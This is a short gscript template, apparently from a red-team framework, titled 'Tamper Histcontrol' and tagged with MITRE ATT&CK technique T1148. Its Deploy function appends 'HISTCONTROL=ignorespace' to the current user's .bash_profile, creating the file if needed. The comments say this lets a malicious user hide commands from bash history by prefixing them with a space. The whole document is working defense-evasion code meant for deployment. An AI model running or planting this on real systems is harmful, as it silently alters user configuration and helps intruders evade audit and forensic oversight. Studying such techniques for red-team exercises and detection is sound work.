// Example gscript template
// Title: Tamper Histcontrol 
// Author: ahhh
// Purpose: sets HISTCONTROL=ignorespace for bash shells, 
// such that a malicious user can launch new terminals and use a single space before a command to evade the history file
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1148

//go_import:os/user as user
//go_import:os as os

//priority:150
//timeout:150
  
function Deploy() {  
    console.log("Starting Tamper Histcontrol");

    var histcontrol = "HISTCONTROL=ignorespace \n";

    var whoami = user.Current();
    var file_location = whoami[0].HomeDir+"/.bash_profile";
    console.log("File Location: "+ file_location);

    var exists = G.file.CheckExists(file_location);
    if ( exists == true ) {   
        var obj = G.file.AppendFileString(file_location, histcontrol);
        if (obj != null) {
            console.log("errors: "+obj.Error());
        } else {
            console.log("file already exists so appended: " + file_location);
        }
    } else {
        var obj = G.file.WriteFileFromString(file_location, histcontrol);
        if (obj != null) {
            console.log("errors: "+obj.Error());
        } else {
            console.log("file newly created: " + file_location);
        }
    }
    console.log("Done Tamper Histcontrol");
    return true;
  }
